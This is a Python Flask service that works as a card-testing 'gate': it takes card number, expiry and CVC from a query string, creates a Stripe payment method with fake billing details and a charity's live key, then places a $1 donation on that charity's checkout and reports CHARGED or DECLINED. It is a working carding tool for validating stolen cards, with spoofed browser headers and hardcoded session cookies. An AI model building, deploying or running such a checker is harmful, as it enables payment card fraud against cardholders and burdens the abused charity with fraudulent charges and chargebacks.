from flask import Flask, request, jsonify
import logging
import os
import requests

app = Flask(__name__)

# Configure error logging to console for Render compatibility
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler()]
)

def fetch_cart_token(cookie_jar):
    cart_headers = {
        'authority': 'www.onamissionkc.org',
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.onamissionkc.org',
        'referer': 'https://www.onamissionkc.org/donate-now',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-model': '"Nexus 5"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"6.0"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    }

    cart_data = {
        'amount': {
            'value': 100,
            'currencyCode': 'USD',
        },
        'donationFrequency': 'ONE_TIME',
        'feeAmount': None,
    }

    try:
        response = requests.post(
            'https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b',
            headers=cart_headers,
            json=cart_data,
            cookies=cookie_jar,
            timeout=30,
            verify=True
        )
        response.raise_for_status()
        cart_result = response.json()

        if 'redirectUrlPath' not in cart_result:
            error_msg = cart_result.get('error', {}).get('message', 'Failed to create new cart')
            logging.error(f"Failed to fetch new cart token: {error_msg}")
            return None, jsonify({'status': 'ERROR', 'message': 'Unable to create new cart'}), 500

        redirect_url = cart_result['redirectUrlPath']
        cart_token = None
        for param in redirect_url.split('&'):
            if param.startswith('cartToken='):
                cart_token = param.split('=')[1]
                break

        if not cart_token:
            logging.error("Failed to extract cart token from redirectUrlPath")
            return None, jsonify({'status': 'ERROR', 'message': 'Unable to extract cart token'}), 500

        return cart_token, None
    except requests.RequestException as e:
        logging.error(f"Failed to fetch new cart token: {str(e)}")
        return None, jsonify({'status': 'ERROR', 'message': 'Unable to create new cart'}), 500

def make_merchant_api_call(cart_token, pid, cookie_jar):
    cookies = {
        'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
        'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',
        'ss_cvt': '1760724937850',
        '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
        '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
    }

    headers = {
        'authority': 'www.onamissionkc.org',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://www.onamissionkc.org',
        'referer': f'https://www.onamissionkc.org/checkout?cartToken={cart_token}',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
    }

    json_data = {
        'email': 'grogeh@gmail.com',
        'subscribeToList': False,
        'shippingAddress': {
            'id': '',
            'firstName': '',
            'lastName': '',
            'line1': '',
            'line2': '',
            'city': '',
            'region': 'NY',
            'postalCode': '',
            'country': '',
            'phoneNumber': '',
        },
        'createNewUser': False,
        'newUserPassword': None,
        'saveShippingAddress': False,
        'makeDefaultShippingAddress': False,
        'customFormData': None,
        'shippingAddressId': None,
        'proposedAmountDue': {
            'decimalValue': '1',
            'currencyCode': 'USD',
        },
        'cartToken': cart_token,
        'paymentToken': {
            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
            'token': pid,
            'type': 'STRIPE',
        },
        'billToShippingAddress': False,
        'billingAddress': {
            'id': '',
            'firstName': 'Davide',
            'lastName': 'Washintonne',
            'line1': 'Siles Avenue',
            'line2': '',
            'city': 'Oakford',
            'region': 'PA',
            'postalCode': '19053',
            'country': 'US',
            'phoneNumber': '+1361643646',
        },
        'savePaymentInfo': False,
        'makeDefaultPayment': False,
        'paymentCardId': None,
        'universalPaymentElementEnabled': True,
    }

    try:
        response = requests.post(
            'https://www.onamissionkc.org/api/2/commerce/orders',
            headers=headers,
            json=json_data,
            cookies={**cookies, **cookie_jar},
            timeout=30,
            verify=True
        )
        return response.json(), response.status_code
    except requests.RequestException as e:
        logging.error(f"Merchant API call failed: {str(e)}")
        return {'failureType': 'Request failed'}, 500

@app.route('/gate=stripe1$/cc=', methods=['GET'])
def process_payment():
    # Get card details from pipe-separated query parameter
    card_param = request.args.get('card', '')
    if not card_param:
        return jsonify({'status': 'DECLINED', 'message': 'Missing card details'}), 400

    try:
        card_number, exp_month, exp_year, cvc = card_param.split('|')
        if not all([card_number, exp_month, exp_year, cvc]):
            return jsonify({'status': 'DECLINED', 'message': 'Incomplete card details'}), 400
    except ValueError:
        return jsonify({'status': 'DECLINED', 'message': 'Invalid card details format'}), 400

    # Format year to 4 digits if needed
    if len(exp_year) == 2:
        exp_year = '20' + exp_year

    # Initialize cookie jar for session continuity
    cookie_jar = {}

    # First API call to create payment method
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = (
        'billing_details[address][city]=Oakford&'
        'billing_details[address][country]=US&'
        'billing_details[address][line1]=Siles+Avenue&'
        'billing_details[address][line2]=&'
        'billing_details[address][postal_code]=19053&'
        'billing_details[address][state]=PA&'
        'billing_details[name]=Geroge+Washintonne&'
        'billing_details[email]=grogeh%40gmail.com&'
        'type=card&'
        f'card[number]={card_number}&'
        f'card[cvc]={cvc}&'
        f'card[exp_year]={exp_year}&'
        f'card[exp_month]={exp_month}&'
        'allow_redisplay=unspecified&'
        'payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&'
        'referrer=https%3A%2F%2Fwww.onamissionkc.org&'
        'time_on_page=145592&'
        'client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&'
        'client_attribution_metadata[merchant_integration_source]=elements&'
        'client_attribution_metadata[merchant_integration_subtype]=payment-element&'
        'client_attribution_metadata[merchant_integration_version]=2021&'
        'client_attribution_metadata[payment_intent_creation_flow]=deferred&'
        'client_attribution_metadata[payment_method_selection_flow]=merchant_specified&'
        'client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&'
        'guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&'
        'muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&'
        'sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&'
        'key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&'
        '_stripe_account=acct_1LwocDFHMGxIu0Ep'
    )

    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=30,
            verify=True
        )
        response.raise_for_status()
        apx = response.json()

        if 'id' not in apx:
            error_msg = apx.get('error', {}).get('message', 'Unknown error')
            return jsonify({'status': 'DECLINED', 'message': error_msg}), 400

        pid = apx['id']

        # Attempt merchant API call with retry on errors
        max_retries = 3
        retry_count = 0
        cart_token, error_response = fetch_cart_token(cookie_jar)
        if error_response:
            return error_response

        while retry_count < max_retries:
            apx1, http_code = make_merchant_api_call(cart_token, pid, cookie_jar)

            if http_code == 200 and 'failureType' not in apx1:
                return jsonify({
                    'status': 'CHARGED',
                    'message': 'Charged $1 successfully',
                    'response': 'CHARGED'
                }), 200

            # Handle specific errors
            if apx1.get('failureType') in ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION']:
                logging.error(f"Error: {apx1['failureType']}, retrying with new cart token")
                cart_token, error_response = fetch_cart_token(cookie_jar)
                if error_response:
                    return error_response
                retry_count += 1
                continue

            # Other failures
            error_msg = apx1.get('failureType', 'Unknown error')
            return jsonify({
                'status': 'DECLINED',
                'message': 'Your card was declined',
                'response': error_msg
            }), 400

        # Max retries reached
        logging.error("Max retries reached for errors")
        return jsonify({
            'status': 'ERROR',
            'message': 'Unable to process payment due to persistent errors',
            'response': 'MAX_RETRIES_EXCEEDED'
        }), 500

    except requests.RequestException as e:
        logging.error(f"Stripe API call failed: {str(e)}")
        return jsonify({'status': 'ERROR', 'message': 'Unable to process payment'}), 500

if __name__ == '__main__':
    # Get port from environment variable for Render compatibility
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
